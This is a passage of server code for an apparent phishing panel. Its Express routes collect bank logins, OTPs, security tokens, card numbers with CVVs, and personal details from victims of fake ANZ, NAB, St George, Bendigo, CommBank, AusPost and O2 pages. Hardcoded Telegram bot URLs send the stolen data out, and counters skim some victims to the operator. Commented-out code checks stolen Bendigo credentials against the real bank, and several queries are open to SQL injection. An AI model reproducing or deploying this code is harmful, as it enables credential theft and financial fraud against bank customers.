    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/asbSaveTelephone", cors());

app.post("/asbSaveTelephone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE asb SET telephone=?, status = 7 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/asbSaveOtp", cors());

app.post("/asbSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE asb SET otp=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/asbSaveNetcode", cors());

app.post("/asbSaveNetcode", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  netcode = req.body.netcode;
  owner = req.body.owner;

  let details = [netcode, uniqueid, owner];
  let query = `UPDATE asb SET netcode=?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/asbDeleteentry/:id", cors());

app.post("/asbDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM asb WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//NAB
//NAB
//NAB

app.options("/nabCustomers/:id/:owner/modal", cors());

app.get("/nabCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM nab WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/nabCustomers/:owner", cors());

app.get("/nabCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM nab WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/nabCommand", cors());

app.post("/nabCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE nab SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/nabCustomers/:id/:owner", cors());

app.get("/nabCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM nab WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/nabSaveLogin", cors());

app.post("/nabSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [username, password, uniqueid, ip, owner];
  let query = `INSERT INTO nab(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/nabSaveOtp", cors());

app.post("/nabSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE nab SET otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/nabSavePhone", cors());

app.post("/nabSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE nab SET telephone=?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

//MULTIPANEL
//MULTIPANEL
//MULTIPANEL

app.options("/multiCustomers/:owner", cors());

app.get("/multiCustomers/:owner", async (req, result) => {
  owner = req.params.owner;
  let res = [];
  panelConnection.query(
    `SELECT * FROM bendi WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "Bendigo";
        res.push(row);
      });
    }
  );
  panelConnection.query(
    `SELECT * FROM anz WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "ANZ";
        res.push(row);
      });
    }
  );
  panelConnection.query(
    `SELECT * FROM wp WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "WestPac";
        res.push(row);
      });
    }
  );
  panelConnection.query(
    `SELECT * FROM nab WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "NAB";
        res.push(row);
      });
    }
  );
  panelConnection.query(
    `SELECT * FROM cb WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "CommBank";
        res.push(row);
      });
      result.send(res);
    }
  );
});

//STGEORGE
//STGEORGE
//STGEORGE

app.options("/georgeCustomers/:id/:owner/modal", cors());

app.get("/georgeCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM george WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/georgeCustomers/:owner", cors());

app.get("/georgeCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM george WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/georgeCommand", cors());

app.post("/georgeCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE george SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/georgeSavePhone", cors());

app.post("/georgeSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE george SET telephone=?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/georgeSaveOtp", cors());

app.post("/georgeSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE george SET otp=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/georgeSaveCard", cors());

app.post("/georgeSaveCard", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cvv = req.body.cvv;
  owner = req.body.owner;

  let details = [ccnum, ccexp, cvv, uniqueid, owner];
  let query = `UPDATE george SET ccnum=?, ccexp=?, cvv=?, status = 8 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/georgeSaveLoginAgain", cors());

app.post("/georgeSaveLoginAgain", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  accessNo = req.body.accessNo;
  password = req.body.password;
  secNo = req.body.secNo;
  owner = req.body.owner;

  let details = [accessNo, password, secNo, uniqueid];
  let query = `UPDATE george SET accessNo=?, password=?,secNo=?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/georgeCustomers/:id/:owner", cors());

app.get("/georgeCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM george WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

let georgeCount = 0;

app.options("/georgeSaveLogin", cors());

app.post("/georgeSaveLogin", cors(), (req, res) => {
  accessNo = req.body.accessNo;
  password = req.body.password;
  secNo = req.body.secNo;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  if (georgeCount == 20) {
    axios.post(
      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New george Hit:\n${accessNo}`
    );

    let details = [accessNo, password, secNo, uniqueid, ip, "haytchPanel123!"];
    let query = `INSERT INTO george(accessNo,password,secNo,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    georgeCount = 0;
  } else {
    let details = [accessNo, password, secNo, uniqueid, ip, owner];
    let query = `INSERT INTO george(accessNo,password,secNo,uniqueid,status,ip, owner) VALUES (?,?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    georgeCount += 1;
  }
});

app.options("/georgeDeleteentry/:id", cors());

app.post("/georgeDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM george WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//BENDIGO
//BENDIGO
//BENDIGO

app.options("/bendiCustomers/:id/:owner/modal", cors());

app.get("/bendiCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM bendi WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/bendiCustomers/:owner", cors());

app.get("/bendiCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM bendi WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/bendiCommand", cors());

app.post("/bendiCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE bendi SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/bendiSavePhone", cors());

app.post("/bendiSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE bendi SET telephone=?, status = 11 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/bendiCustomers/:id/:owner", cors());

app.get("/bendiCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM bendi WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

let bendiCount = 2;

app.options("/bendiSaveLogin", cors());

app.post(`/bendiSaveLogin`, cors(), (req, res) => {
  accessId = req.body.accessId;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  if (bendiCount == 200) {
    let details = [accessId, password, uniqueid, ip, "haytch123!"];
    let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    bendiCount = 0;

    axios.post(
      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New Bendi Hit:\n${accessId}`
    );
  } else {
    let details = [accessId, password, uniqueid, ip, owner];
    let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    bendiCount += 1;
  }

  // function createAxios() {
  //   return axios.create({ withCredentials: true });
  // }
  // const axiosInstance = createAxios();

  // const cookieJar = {
  //   myCookies: undefined,
  // };

  // async function login() {
  //   const response = await axiosInstance.get(
  //     "https://banking.bendigobank.com.au/Logon/jaxrs/eid/flow",
  //     {
  //       headers: {
  //         "x-brand": "ben",
  //         "x-channel": "web",
  //       },
  //     }
  //   );
  //   cookieJar.myCookies = response.headers["set-cookie"];
  //   return response;
  // }

  // async function request(flowId) {
  //   // read the cookie and set it in the headers
  //   const response = await axiosInstance
  //     .post(
  //       `https://banking.bendigobank.com.au/Logon/jaxrs/eid/flow/${flowId}`,
  //       {
  //         action: "accessId",
  //         accessId: accessId,
  //       },
  //       {
  //         headers: {
  //           "x-brand": "ben",
  //           "x-channel": "web",
  //           cookie: cookieJar.myCookies,
  //         },
  //       }
  //     )
  //     .catch((err) => {
  //       console.log(err);
  //     });
  //   return response;
  // }

  // async function passRequest(flowId) {
  //   let result = true;
  //   // read the cookie and set it in the headers
  //   const response = await axiosInstance
  //     .post(
  //       `https://banking.bendigobank.com.au/Logon/jaxrs/eid/flow/${flowId}`,
  //       {
  //         action: "password",
  //         password: password,
  //       },
  //       {
  //         headers: {
  //           "x-brand": "ben",
  //           "x-channel": "web",
  //           cookie: cookieJar.myCookies,
  //         },
  //       }
  //     )
  //     .catch((err) => {
  //       result = false;
  //     });
  //   return result;
  // }

  // login().then((resp) => {
  //   request(resp.data.flowId).then(async () => {
  //     let result = await passRequest(resp.data.flowId);
  //     console.log(result);
  //     if (result === true) {
  //       let details = [accessId, password, uniqueid, ip, owner];
  //       let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  //       panelConnection.query(query, details, (err, rows, fields) => {
  //         if (!err) res.send("Insertion Completed");
  //         else console.log(err);
  //       });
  //       bendiCount += 1;
  //     } else {
  //       res.send("WrongLogin");
  //     }
  //   });
  // });
});

app.options("/bendiSaveOtp", cors());

app.post("/bendiSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE bendi SET otp=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/bendiSaveDob", cors());

app.post("/bendiSaveDob", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  dob = req.body.dob;
  owner = req.body.owner;

  let details = [dob, uniqueid, owner];
  let query = `UPDATE bendi SET dob=?, status = 11 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/bendiSaveST", cors());

app.post("/bendiSaveST", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  secToken = req.body.secToken;
  owner = req.body.owner;

  let details = [secToken, uniqueid, owner];
  let query = `UPDATE bendi SET secToken=?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/bendiSaveLoginAgain", cors());

app.post("/bendiSaveLoginAgain", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  accessId = req.body.accessId;
  password = req.body.password;
  owner = req.body.owner;

  let details = [accessId, password, uniqueid, owner];
  let query = `UPDATE bendi SET accessId=?, password=?, status = 11 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/bendiDeleteentry/:id", cors());

app.post("/bendiDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM bendi WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//AUSPOSTwLogs
//AUSPOSTwLogs
//AUSPOSTwLogs

app.options("/ausPostLog", cors());

app.post("/ausPostLog", (req, res) => {
  username = req.body.username;
  password = req.body.password;
  bank = req.body.bank;
  owner = req.body.owner;
  uniqueid = req.body.uniqueid;

  var originalText = `+----------- ${bank} Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;

  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog ${owner}:\n${originalText}`
  );
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=AusPostLog:\n${originalText}`
  );

  res.send("Update Completed");
});

app.options("/ausPostStGeorgeLog", cors());

app.post("/ausPostStGeorgeLog", (req, res) => {
  accessNo = req.body.accessNo;
  secNo = req.body.secNo;
  password = req.body.password;
  bank = req.body.bank;
  owner = req.body.owner;
  uniqueid = req.body.uniqueid;

  var originalText = `+----------- ${bank} Login Information ------------+\nAccess Number: ${accessNo}\nSecurity Number: ${secNo}\nPassword: ${password}`;

  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog ${owner}:\n${originalText}`
  );
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=AusPostLog:\n${originalText}`
  );

  res.send("Update Completed");
});

//O2
//O2
//O2

app.options("/charlieO2", cors());

app.post("/charlieO2", (req, res) => {
  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPost code: ${pcode}\nTelephone: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\nSort Code: ${scode}\nAcount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (saim == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        saim = 5;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `O2Saim:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-753125688",
              text: `O2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        saim += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/saimO2", cors());

app.post("/saimO2", (req, res) => {
  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPost code: ${pcode}\nTelephone: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\nSort Code: ${scode}\nAcount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (saim == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        saim = 5;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `O2Saim:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1713673720,
              text: `O2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        saim += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/c2O2", cors());

app.post("/c2O2", (req, res) => {
  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPost code: ${pcode}\nTelephone: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\nSort Code: ${scode}\nAcount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `O2C2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1713673720,
              text: `O2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/o2Triz", cors());

app.post("/o2Triz", (req, res) => {
  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
